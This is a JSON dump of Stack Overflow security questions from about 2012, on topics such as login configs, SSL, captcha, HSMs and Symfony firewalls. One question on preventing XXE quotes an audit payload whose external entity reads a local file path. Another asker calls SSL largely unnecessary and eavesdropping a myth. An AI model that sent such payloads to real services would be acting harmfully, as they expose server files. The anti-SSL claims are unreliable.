&lt;form-error-page&gt;login.html&lt;/form-error-page&gt;\n    &lt;/form-login-config&gt;\n&lt;/login-config&gt;\n</code></pre>\n\n<p>On accessing / I'm sent to login.html and if I put an invalid password in then to /j_security_check. If I put the correct password in though I'm sent to / but get the following error in the browser:</p>\n\n<pre><code>HTTP Status 403 - Access to the requested resource has been denied\n</code></pre>\n\n<p>Why would I be being denied access to the index.html after successfully negotiating the login form? There's no sign of any log output.</p>\n"},{"tags":["security","drupal","hack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":29,"score":-3,"question_id":12991498,"title":"Drupal Website Best Security Practices","body":"<p>I'd like to know what are the best practices to secure a Drupal website </p>\n"},{"tags":["php","javascript","arrays","json","security"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12990705,"title":"Javascript to PHP Security","body":"<p>I can't seem to find an almost exact question so I might as well ask away.</p>\n\n<p>Is it really a standard practice to send variables from Javascript to PHP? I'm planning to send array to PHP after some several assessment within Javascript - passing variables here and there...only to be combined again as an array, and as I've said, will be passed to PHP. Am I missing something? I hardly see any tutorials to do this, mostly the other way around - that is, PHP array to Javascript. Makes me think, maybe it just isn't being advised to do Javascript to PHP due to security reasons.</p>\n\n<p>Simply put, will sending Javascript array to PHP that will later on be saved to database be dangerous? I haven't really FULLY read how to do it, just scanned the very few that I could find...json stringify, $_POST, json encode, json decode. If it is fine to do JS to PHP passing, and since it is related to my question anyway, can someone point me which of those mentioned is best for better security? Thanks!</p>\n"},{"tags":["php","security","http","httpwebrequest","bots"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12989532,"title":"How to have app use a private .php webpage?","body":"<p>I want my desktop app to hit a <code>.php</code> page on my web site.  The <code>.php</code> page will perform a server side task and will return an HTTP response indicating success/failure etc.</p>\n\n<p>How can I ensure only my desktop app will be able to access the <code>.php</code> page?  How can I prevent bots, crawlers and hackers from accessing the page?</p>\n\n<p>Should I have a random phrase in the URL? eg:</p>\n\n<pre><code>http://www.website.com/s3g8k0d1q6/myphpfile.php\n</code></pre>\n"},{"tags":["c#",".net","security","internet-explorer"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":90,"score":2,"question_id":7956275,"title":"Is is possible to elevate security in IE .NET Add-on?","body":"<p>I have a C#/.NET (VS2010) IE add-on which uses <code>Marshal.GetActiveObject()</code> to a running instance of an application (COM object) and then send commands to it via the <code>Invoke()</code> method. In XP it works fine. In W7/Vista, it requires both IE and the target application to be \"Run as Administrator\" or else it generates the exception:</p>\n\n<pre><code>[Operation unavailable (Exception from HRESULT:0x8000401E3 MK_E_UNAVAILABLE))]\n</code></pre>\n\n<p>Here's the code:</p>\n\n<pre><code>private void _BtnPlace_onclick(IHTMLEventObje)\n{\n    ....\n    ....\n    object AutoCADApp = null;\n    try\n    {\n        // Does not return the object from the Running Objects Table unless run 'As Administrator'\n\n        AutoCADApp = System.Runtime.InteropServices.Marshal.GetActiveObject(\"AutoCAD.Application\");\n    }  \n    catch (Exception ex)\n    {\n        MessageBox.Show(\"Unable to locate a running version of AutoCAD on this machine. Please make sure AutoCAD is running.\\n\\n [\" + ex.Message + \"]\\n\", \"Error\", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);\n        return;\n     } \n\n    object acadDoc = GetProperty(AutoCADApp, \"ActiveDocument\");\n    InvokeMethod(acadDoc, \"SendCommand\", keyin);\n}\n</code></pre>\n\n<p>Any ideas on how to address the security issues to make this add-on run in W7/Vista (asking it to prompt for elevated privileges is ok)?</p>\n"},{"tags":["security","ssl","https","web-security"],"answer_count":5,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":2950,"score":3,"question_id":4495570,"title":"To use or not to use SSL? Why use SSL always?","body":"<p>The argument for using SSL is to prevent some malicious user who has gone through the pains of snooping your traffic being able to read your traffic. So while it may make sense if you are using an unsecured wireless (non WPA2) network to use SSL when logging on to your bank account or giving your credit card number, I find it difficult to see it's neccessaity in more common business cases. </p>\n\n<p>Why even bother with SSL?  (when your client is not going to be on an unsecured wireless network)</p>\n\n<p>The only way someone can snoop your particular HTTP connections and data therein is if they have admin access to your router (and then only if there is some facility to monitor/copy traffic), installed some tool on your machine (a key logger of course would by pass SSL anyway) or they monitor you at the ISP (for which a warrant is required in most jurisdictions).</p>\n\n<p><strong>Update Warning</strong> Some jurisdictions are not as free as you may think, particularly the 1st and 2nd world, e.g. in the UK, government may soon not require a warrant: <a href=\"http://en.wikipedia.org/wiki/Communications_Data_Bill_2008\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Communications_Data_Bill_2008</a> which will probably entail the ability to read websites as they were historically (i.e. decrypt SSL) and the US's \"Patriot Act\" <a href=\"http://en.wikipedia.org/wiki/US_Patriot_Act#Title_II:_Surveillance_procedures\" rel=\"nofollow\">http://en.wikipedia.org/wiki/US_Patriot_Act#Title_II:_Surveillance_procedures</a></p>\n\n<p>Furthermore:</p>\n\n<ul>\n<li>Accepting SSL connections server side adds significant load as the establishing of a connection is processor intensive (during the generation of secret keys).</li>\n<li>Publicly trusted SSL certificates have to be purchased from a 3rd Party periodically </li>\n</ul>\n\n<p><strong>UPDATE:</strong> I am actually using SSL, though I thought it worthwhile to ask the question anyway. Certainly I think there are time SSL is not necessary. Maybe this could be turned into a community wiki of the pros and cons of SSL? If so how?</p>\n\n<p>There seems to be commonly occurring myth in the answers below: \"anyone between you and the server can eavesdrop on you\"... </p>\n\n<ul>\n<li>This is not not possible on the Internet as the low level TCP routers only forward packets where they have to go and even in the same session can be routed through different routes, and no one can look at these packets except in extreme cases - technically or lawfully.\n</li> \n<li>\nAs for someone at the ISP looking at your traffic I wonder why they would signal you out and look at the 'so important data' which no doubt is boring to them, this is also illegal without a warrant. \n<li>\nOn your LAN (except wireless) unless you are using a dinosaur Hub which broadcasts every packet there is no way listen on someone else's traffic - this is not possible because the hardware simply does not send the packets to you even if you have your network card in promiscuous mode and are using a sniffing tool such as Snort or Wireshark. \n</li>\n</ul>\n\n<p>Passive ARP poisoning is one way to  listen in but has to be done internally and should be picked up as name conflicts etc. start occuring and often the default gateway would be static so would be v. difficult cause the default gateway will be on before you.</p>\n"},{"tags":["flex","security","certificate"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":209,"score":1,"question_id":8586411,"title":"Flex Certificate .crt file into ByteArray for secureSocket calss addBinaryChainBuildingCertificate method","body":"<p>I have a certificate file which I want to import into flex application to establish a secure socket connection with a sever. But I am a getting an exception which says <code>ArgumentError: Error #2004: One of the parameters is invalid</code>.</p>\n\n<pre><code>var urlLoader:URLLoader = new URLLoader();\nvar request:URLRequest = new URLRequest(\"xyz.crt\");\nurlLoader.addEventListener(Event.COMPLETE, doEvent);\nurlLoader.dataFormat = URLLoaderDataFormat.BINARY;\nurlLoader.load(request);\n\nprivate function doEvent(evt:Event):void {\nvar ldr:URLLoader = evt.target as URLLoader;\nsecureSocket.addEventListener( Event.CONNECT, onConnect )\nsecureSocket.addEventListener( IOErrorEvent.IO_ERROR, onError );\ntry{\nsecureSocket.addBinaryChainBuildingCertificate(ldr.data,true );\nsecureSocket.connect( \"192.168.2.100\", 443 );\n\n}\ncatch ( error:Error )\n{\nAlert.show( error.toString() );\n}\n}\n</code></pre>\n"},{"tags":["php","security","login","captcha"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":156,"score":3,"question_id":12235619,"title":"Enable Captcha after several login failure - How to implement this?","body":"<p>I'm working on an auth system with login failure.<br>\nIf the user fails to login, the attempts number in database is incremented and if a defined limit is reached, PHP sets a session captcha variable to true.<br>\nSo when the user (or spam bot) gets the login page again, a captcha form is shown thanks to the session variable</p>\n\n<p>But since Spam bots could eventually delete the session cookie and retry, this may be not  effective.</p>\n\n<p>Should I use a database solution instead ? How would you implement this (with/or without the database) ?</p>\n"},{"tags":["linux","security","svn"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12987974,"title":"Keeping Linux configuration files in SVN (Subversion)","body":"<p>How good is the idea of preserving the <strong>Linux</strong> configuration files in version control system (<strong>SVN</strong>, for example)? For example, to see all changes in the firewall, change history. In particular, it is possible to keep these groups of files -</p>\n\n<ul>\n<li>Access files</li>\n<li>Booting and login / logout</li>\n<li>File system</li>\n<li>System administration</li>\n<li>Networking</li>\n<li>System commands</li>\n<li>Daemons</li>\n</ul>\n\n<p>...</p>\n\n<p>Ie For example, I am making changes to the firewall and do commit the file to the repository. Then, if something goes not so, I can extract the file and compare it to that is. This can help detect some unauthorized access.</p>\n"},{"tags":["security","ssl","https","cryptography"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":784,"score":3,"question_id":5864161,"title":"Alternatives to SSL","body":"<p>So over the last few years it seems like SSL has taken rather a beating from the security community. While the technical reasons are beyond my understanding, I understand the concepts and understand that SSL is becoming more and more insecure as new weaknesses are found.</p>\n\n<p>My question to you guys is this:\nIf SSL is \"broken\", is there a technology that can take its place? Is there a more secure alternative?</p>\n\n<p>Any thoughts are appreciated! :)</p>\n\n<p>(ps, I'm not specifically talking about HTTPS - I mean any SSL technology)</p>\n"},{"tags":["php","web-services","security","curl","dns"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12987652,"title":"Reliably detect caller domain over cURL request?","body":"<p>OK so server-side security is not my forte. Basically, I'm building a service which users may use (via an SDK) only on the domain they stipulated when they signed up.</p>\n\n<p>The SDK calls my web service over cURL in PHP.</p>\n\n<p>Would I be right in thinking I cannot reliably detect the caller domain, i.e. enforce that it is the same domain they stipulated when signing up?</p>\n\n<p>cURL of course sends this over headers, but headers can always (?) be faked.</p>\n\n<p>Is there a better course of action to enforce domain for this sort of thing?</p>\n\n<p>(NB I'm already using an API key, too - it's just I wanted to restrict domain, too)</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["wcf","security","rest","ssl"],"answer_count":2,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":4008,"score":9,"question_id":393580,"title":"WCF Authentication WITHOUT SSL","body":"<p>Is there a way to setup authentication (ala \"Basic Authentication\") without actually setting up an SSL Certificate?  I'd also like to do this in REST or regular SOAP WCF Services, preferably in REST, but would like to be able to mix the services.  In other words, \"I want to be able to send a regular old username and password just like in Basic Authentication but without the SSL.\"  Is there a way to do this?</p>\n"},{"tags":["c#","visual-studio-2008","visual-studio-2010","security","manifest"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":158,"score":0,"question_id":6059615,"title":".Net Console App keeps crashing","body":"<p>I added the Manifest file with the element</p>\n\n<pre><code>&lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" /&gt;\n</code></pre>\n\n<p>I built the project and it keeps crashing when a non-administrator runs it.</p>\n\n<blockquote>\n  <p>Unhandled Exception: System.Security.SecurityException: Request for\n  the permissi on of type\n  'System.Security.Permissions.RegistryPermission, mscorlib, Version=2.\n  0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' failed.    at System.Security.CodeAccessSecurityEngine.Check(Object demand,\n  StackCrawlMa rk&amp; stackMark, Boolean isPermSet)    at\n  System.Security.CodeAccessPermission.Demand()    at\n  Microsoft.Win32.RegistryKey.CheckSubKeyReadPermission(String\n  subkeyName)    at\n  Microsoft.Win32.RegistryKey.CheckOpenSubKeyPermission(String\n  subkeyName, B oolean subKeyWritable)    at\n  Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable) \n  at\n  LotusTrustedSites.RegistryKeyExtensionMethods.GetOrCreateSubKey(RegistryKe\n  y registryKey, String parentKeyLocation, String key, Boolean writable)\n  at LotusTrustedSites.ReportDownloader.Main(String[] args) The action\n  that failed was: Demand The type of the first permission that failed\n  was: System.Security.Permissions.RegistryPermission</p>\n  \n  <p>The assembly or AppDomain that failed was: MyApp, Version=1.0.0.0,\n  Culture=neutral, PublicKeyToken=null The method that caused the\n  failure was: Microsoft.Win32.RegistryKey\n  GetOrCreateSubKey(Microsoft.Win32.RegistryKey, Syste m.String,\n  System.String, Boolean)</p>\n</blockquote>\n"},{"tags":["visual-studio-2010","security","windows-7","uac"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12981102,"title":"How to Setup particular Programs in Windows7 Administrator access to Non-Admin User","body":"<p>I have team of developers in my company, and i have windows7 installed with <code>UAC</code> on all the machines, now the Dotnetnuke Compiled Template require Administrator access to create, because they are linked with IIS, so everytime they want to work on DNN Modules, they calls me to input the Credentials, and if they by-mistake close the VS, they again my Credentials, is there a way to run only Particular Application with Administrator on Standard User Accounts.</p>\n"},{"tags":["java","security"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":74,"score":3,"question_id":12986333,"title":"Appearance of Java Security dialog","body":"<p>Somebody asked me if I'd seen the Java Security dialog appear when loading a signed applet.  What does the Java Security dialog look like?</p>\n"},{"tags":["java","security","applet","code-signing","javasound"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12970190,"title":"Applet sound recorder","body":"<p>I have an applet which is doing some sound recording work. When I run it on eclipse with Applet viewer , the sound recording and its play back is working fine. But when I put that applet in browser, all the buttons and controls are visible but the recording and play back is not working. Any reasons for that?</p>\n\n<p>I have signed the jar but still it is not working.  I verified my jar from jarsigner. It messages </p>\n\n<pre><code>jar is unsigned (Signature missing or unparsable)\n</code></pre>\n\n<p>What does this message means actually?</p>\n\n<h3>Update</h3>\n\n<p>The Jar is now signed and verified (as per comments), new exception is:</p>\n\n<pre><code>   java.lang.SecurityException: trusted loader attempted to load sandboxed resource    from file:/D:/Junaid/workspace/AudioProjectApplet/bin/com/audio/\n   at com.sun.deploy.security.CPCallbackHandler$ParentCallback.check(Unknown Source)\n   at com.sun.deploy.security.CPCallbackHandler$ParentCallback.access$1500(Unknown Source)\n   at com.sun.deploy.security.CPCallbackHandler$ChildElement.checkResource(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.checkResource(Unknown Source)\n   at sun.plugin2.applet.Applet2ClassLoader.findClass(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\n   at java.lang.ClassLoader.loadClass(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.loadCode(Unknown Source)\n   at sun.plugin2.applet.Plugin2Manager.initAppletAdapter(Unknown Source)\n   at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)\n   at java.lang.Thread.run(Unknown Source)\n</code></pre>\n"},{"tags":["security","wif","claims-based-identity"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12974966,"title":"Appropriate usage of tokens in a claims based security model?","body":"<p>i'm new to claims based security. I understand the premise but have some questions regarding the token.</p>\n\n<p>From what I understand, the token will carry all of the claims for a given user, and that different systems will use different claims to determine authorization to a system. On this point I have several questions;</p>\n\n<p>1) Does this mean that the STS is aware of all claims for all systems? Does this not mean the token could become gargantuan in size? Or does the token only carry the claims as needed by the relying party requesting the authentication?</p>\n\n<p>2) Should claims be leveraged to determine fine grained access to a system, or are relying parties expected to maintain a separate means of tracking permissions?</p>\n\n<p>I have a system with 100's of different user permissions. In trying to move to a claims based solution, the missing piece for me is, are all of the permissions meant to be managed by the STS and provided in the token? Or, do I use the token to authenticate the user, then manage permissions myself? Or perhaps some inbetween?</p>\n\n<p>Help and guidance would be appreciated!</p>\n\n<p>Kind regards\nTheMistry</p>\n"},{"tags":["java","php","security","mongodb","mongo-java"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":368,"score":0,"question_id":6479393,"title":"Mongodb: client side user authentication security issue","body":"<p>I am using Mongodb Java driver for my Java client application. it needs to connect to mongodb server running remotely.</p>\n\n<p>I am concerned that someone could decompile jar and find out the ip address to the mongodb server and access it. but the user needs to have read and write access. Should I create a database for each user and authenticate them? or create a User collection myself?</p>\n\n<pre><code>mongo =  new Mongo(\"mongodb.server\", 27017);\n                db = mongo.getDB(\"mydatabase\");\n                db.authenticate(\"test\", \"password\");\n</code></pre>\n\n<p>btw, the db.authenticate requires char[] as password....so that db.authenticate() is not working.               </p>\n\n<p>Another solution I thought of was to use an middleman server which will connect to mongodb only. The application would connect to the middleman server via HTTP POST.</p>\n\n<p>However, I need to directly store Java objects serialized into JSON on mongodb, so using the middleman server it makes things difficult.</p>\n"},{"tags":["javascript","security","browser-bugs"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12985166,"title":"Executing JavaScript on an iframe's contents from a different domain","body":"<p>Is this denied by the browser? Is it possible?</p>\n\n<p>If so, are that browser bugs that allow it to happen? I noticed this:</p>\n\n<p><a href=\"http://html5sec.org\" rel=\"nofollow\">http://html5sec.org</a></p>\n\n<p>How can you close these bugs and prevent them from working on your website? Can I detect if someone is trying to execute javascript from another domain?</p>\n\n<p>Thanks.</p>\n"},{"tags":["mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":12984304,"title":"Prompt for password when mysql client reconnects","body":"<p>I am invoking mysql through the following : </p>\n\n<pre><code>mysql -h localhost -u user -p db \n</code></pre>\n\n<p>This will lead to the user being prompted to enter the password.</p>\n\n<p>However I have set the interactive_timeout to 60 secs.</p>\n\n<p>After 60 sec, the client will timeout but since the reconnect option is not set to false hence it will try to reconnect.\nWhile reconnect, the mysql client does not prompt for password.\nI want to make it prompt for password while reconnecting.\nCan anyone help me on this.</p>\n\n<p>Here is the sample output</p>\n\n<pre><code>mysql -h localhost -u user -p db \nEnter password:\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nWelcome to the MySQL monitor. Commands end with ; or \\g.\nYour MySQL connection id is 26\nServer version: 5.1.58 MySQL Community Server (GPL)\n\nCopyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.\nThis software comes with ABSOLUTELY NO WARRANTY. This is free software,\nand you are welcome to modify and redistribute it under the GPL v2 license\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; show variables;\nERROR 2006 (HY000): MySQL server has gone away\nNo connection. Trying to reconnect...\nConnection id:  30\nCurrent database: db\n</code></pre>\n\n<p>I want it to prompt for password while reconnecting</p>\n"},{"tags":["php","security","dirname"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":53,"score":1,"question_id":12983581,"title":"Is the using of dirname(__FILE__) a security risk?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10424963/best-practice-for-php-paths\">Best practice for PHP paths</a>  </p>\n</blockquote>\n\n\n\n<p>looking at the code of Joomla I see that in the first line of the index, it defines the base path of installation with the </p>\n\n<pre><code>dirname(__FILE__)\n</code></pre>\n\n<p>is this a font of possible risk for the site, I mean if a non controlled error message show the internal path of the Joomla directory, because of, for example a failed include, can it be used to perform some kind of attack to the site ? If yes, is it convenient to use this function ? Any idea is welcome.</p>\n\n<p>Thanks</p>\n"},{"tags":["java","spring","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12983380,"title":"How do I utilize Spring 3's Security with SSO?","body":"<p>We are using Spring 3 framework and we have a SSO (Single sign on) provider which redirects to our app passing special tokens in the request to indicate the user is authenticated. </p>\n\n<p>I would like to use Spring security to handle stuff like denying access to pages unless the user is authenticated, but I'd also like to be able to bypass this on my local machine while developing the application.</p>\n\n<p>So in the production scenario, I expect the SSO to redirect to our app, specifically to a \"/login.html\" target which is supposed to somehow trigger a custom class I write to pull the expected login info from request and load up the user's info from our database and put it in session for the rest of the app to use.</p>\n\n<p>Then in the development scenario I need to bypass SSO by just being able to create a session using a custom login page and then load the user's info from database just as above.</p>\n\n<p>I am trying to figure out how to do it myself but I can't seem to wrap my head around all of it. </p>\n\n<p>Any info on how to accomplish this even just high level kind of road map would be a huge help</p>\n"},{"tags":["security","cakephp","ssl","cakephp-2.0"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12981148,"title":"Redirecting SSL to non-SSL after login authentication","body":"<p>I have a Cakephp 2+ site that needs certain actions to require an SSL connection, (i.e. login, password reset, etc.), but I don't require the entire site to be secure.  While implementing this I found that the Session was not being saved when moving between the SSL and non-SSL pages.  I found this question on stack <a href=\"http://stackoverflow.com/a/12068099/1353839\">http://stackoverflow.com/a/12068099/1353839</a> that solved the issue for me, but I am wondering at what cost.</p>\n\n<p>The answer in the above question required commenting out a line in lib/Cake/Model/Datasource/ as follows:</p>\n\n<pre><code>if (!isset($sessionConfig['ini']['session.cookie_secure']) &amp;&amp; env('HTTPS')){\n   // $sessionConfig['ini']['session.cookie_secure'] = 1; // &lt;-- Commented Out\n}\n</code></pre>\n\n<p>Are there any security ramifications to doing this?  Also, is there a way to do this without affecting the cake core files since that is generally frowned upon?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["security","ssh","public-key-encryption","ssh-keys"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":21,"score":-2,"question_id":12982983,"title":"Should I have multiple ssh key pairs? If so, how to deal with them?","body":"<p>I have never thought much about ssh key pairs, however, I use them on a daily basis: git, ssh password-less auth, encryption, etc.</p>\n\n<p>And I have been:</p>\n\n<ul>\n<li>generating a pair per device;</li>\n<li>adding all public keys to all authorized keys of all other devices;</li>\n<li>same for github etc;</li>\n</ul>\n\n<p>One pair per device seems to make sense as they have the pmatos@ in the end. On the other hand, from the perspective that they should identify you, it doesn't make much sense to have more than one pair and you should probably just copy them from one device to the next when you move to another device and keep the private key in a vault somewhere.</p>\n\n<p>Also, imagine I publish a public key for someone to encrypt something for me? From which keypair should I publish the public key from (or should I generate yet another pair for this purpose)?</p>\n\n<p>What's the correct way to handle this?</p>\n"},{"tags":["java","security","maven","gpl","bouncycastle"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12982595,"title":"openjdk sun.security libs on maven?","body":"<p>I have <a href=\"https://github.com/read-write-web/rww-play\" rel=\"nofollow\" title=\"rww-play\">a project</a> where I need to </p>\n\n<ol>\n<li>create an X509 certificate - this is easy with <a href=\"https://dvcs.w3.org/hg/read-write-web/file/258d2757ef3d/src/main/scala/auth/X509Cert.scala#l45\" rel=\"nofollow\">sun.security.x509 classes</a></li>\n<li>build a <a href=\"http://en.wikipedia.org/wiki/Spkac\" rel=\"nofollow\" title=\"Signed Public Key and Challenge\">Signed Public Key and Challenge</a> parser, which should be relatively easy too using sun.security.*</li>\n</ol>\n\n<p>The problem is that the sun.security.* classes are not available on all java platforms (only on the sun/oracle ones). </p>\n\n<p>I could use <a href=\"http://www.bouncycastle.org/latest_releases.html\" rel=\"nofollow\" title=\"Bouncy Castle\">BouncyCastle</a> ( and I have in the <a href=\"https://github.com/bblfish/foafssl-java/\" rel=\"nofollow\" title=\"keygen\">foafssl/keygen</a> project ) but</p>\n\n<ul>\n<li>their jars are very heavy, requiring a minimum of 2MB. This is annoying knowing that most of the code is already shipping in the jdk - ( so one can reduce the size of the code later it is true...)</li>\n<li>they seem to take a lot of time to get their jars on maven central, their latest <a href=\"http://repo1.maven.org/maven2/org/bouncycastle/bcprov-jdk16/\" rel=\"nofollow\" title=\"bcprov-jdk16-1.46\">bcprov-jdk16-1.46</a> dating from December 2011</li>\n<li>I found their APIs very confusing -- but they may have improved, and my skills at ASN.1 parsing are quite shaky</li>\n</ul>\n\n<p>So the other solution is that <a href=\"http://openjdk.java.net/projects/jdk7/\" rel=\"nofollow\" title=\"openjdk7\">OpenJDK7</a> is licenced under the GPL 2 with classpath exception. ( See <a href=\"http://www.docjar.org/docs/api/sun/security/x509/X509Cert.html\" rel=\"nofollow\" title=\"X509Cert source code\">X509Cert source code</a> for example) I think this means one should be able to compile the libraries, put them on maven and use them from there. Then one could write code that would fetch those remote jars if needed and not just use the ones shipped on the OS. What do people make of this solution?</p>\n"},{"tags":["java","security","encryption","hsm"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":46,"score":0,"question_id":12981977,"title":"How do I integrate HSM encryption with JAVA?","body":"<p>How do i integrate Hardware Security Module encryption with a java application? I'm looking for code samples to connect to HSMs, generate keys(asymmetric, symmetric), encrypt and decrypt data (asymmetric, symmetric) and store keys.</p>\n"},{"tags":["security","google-app-engine","urllib2","choice","urlfetch"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12972306,"title":"Using Google AppEngine Urlfetch instead of urllib2","body":"<p>What is the difference between googles urlfetch over the python lib urllib2 ?</p>\n\n<p>When I came upon Google's urlfetch i thought maybe there were security reasons. Perheps google were safer in terms of malicous urls or something?</p>\n\n<p>Is there any reason why I should choose google over urllib2?</p>\n\n<p>Thanks!</p>\n"},{"tags":["java","security","jaxb","jax-ws","ws-security"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":96,"score":3,"question_id":12977299,"title":"Preven XXE Attack with JAXB","body":"<p>Recently, we had a security audit on our code, and one of the problem is that our application is subject to the <strong>Xml EXternal Entity</strong> (XXE) attack.</p>\n\n<p>Basically, the application is an calculator that receives inputs as XML, through a Web-Service.</p>\n\n<p>Here is an example of such XXE attack on our application:</p>\n\n<pre><code>&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n   &lt;soapenv:Header/&gt;\n   &lt;soapenv:Body&gt;\n      &lt;foo:calculateStuff&gt;\n         &lt;!--Optional:--&gt;\n         &lt;xmlInput&gt;&lt;![CDATA[&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE currency [  \n   &lt;!ENTITY include SYSTEM \"file:///d:/\" &gt;]&gt;\n&lt;calcinput&gt;...&lt;/calcinput&gt;\n]]&gt;&lt;/xmlInput&gt;\n      &lt;/foo:calculateStuff&gt;\n   &lt;/soapenv:Body&gt;\n&lt;/soapenv:Envelope&gt;\n</code></pre>\n\n<p>As you can see, we can refers to an entity that points to an external file (<code>\"file:///d:/\"</code>).</p>\n\n<p>Regarding the XML input itself (the <code>&lt;calcinput&gt;...&lt;/calcinput&gt;</code> part) is unmarshalled with JAXB (v2.1). The web-service part is based on jaxws-rt (2.1).</p>\n\n<p>What do I need to do to secure my web-service?</p>\n\n<p>Thanks.</p>\n"},{"tags":["facebook","security","api","privacy"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12970598,"title":"Facebook API to access privacy and security settings","body":"<p>Is there a way to get security and privacy settings of a Facebook account? The app that's being designed will need to:</p>\n\n<ul>\n<li>login to a Facebook account,</li>\n<li>retrieve all privacy and security settings, and</li>\n<li>display the settings on a single page in a custom way.</li>\n</ul>\n\n<p>I did a lot of online searching, checked the FB Developer's site, but found nothing relevant so far.</p>\n"},{"tags":["php","javascript","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12977135,"title":"Security: tracking pixels","body":"<p>Our company works with affiliates that promote our products. They get paid based on how many sales they bring to us.</p>\n\n<p>To track conversions, they ask us to put third party tracking pixels on our \"thank you\" page (final page where our customer is being redirected after payment through third party billing processor is complete).</p>\n\n<p>So, we ended up with a ton of tracking JS code and hidden iframes on our \"thank you\" page.</p>\n\n<p><strong>Is it safe?</strong><br>\nThe billing processor sends sensitive data to this page via GET variables that we'd rather not make accessible to the affiliates.</p>\n\n<p>Or maybe there is a better way to do this? Like, store all the tracking code from our affiliates in a database and only load the one that matches the customer's referral?</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I'm worried about \"third party tracking pixels\" that are not from the \"trusted\" third parties (Like Google, Yahoo) but custom-made by our affiliates.</p>\n"},{"tags":["security","authentication","symfony2","firewall"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":122,"score":0,"question_id":11801622,"title":"How to authenticate on 2 different symfony2 firewalls at the same time?","body":"<p>I have a Symfony application with 2 areas, one for clients accessing from a web page an other for API calls from AJAX and web services.</p>\n\n<p>Each one of this areas is protected with a firewall on its own. The WEB interface is authenticated with a log in form and the API with <code>http_basic</code>.</p>\n\n<p>Both firewalls work fine, but when the WEB interface makes an AJAX call to the API interface, then the browser prompts the user to log in again, even when he was already logged in (via log in form). This is what I want to avoid. I Would like that both firewalls were authenticated at the same time to prevent this prompt.</p>\n\n<p>I've seen another question with <strong>exactly</strong> the same problem. But they are using <code>http_basic</code> authentication on both firewalls, so, the solution proposed did't work on my case:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/9075041/authenticate-multiple-symfony2-firewalls-with-one-login-form\">Authenticate multiple symfony2 firewalls with one login form</a></p>\n\n<p>My security.yml</p>\n\n<pre><code>#....\nfirewalls:\n    api:\n        pattern:    ^/API\n        context: primary_auth\n        stateless:  true\n        http_basic: \n            realm: \"API: Please log in\"\n\n    web:\n        pattern:    ^/\n        context: primary_auth\n        form_login:\n            check_path: /login_check\n            login_path: /login\n            provider: fos_userbundle\n        logout:\n            path:   /logout\n            target: /\n        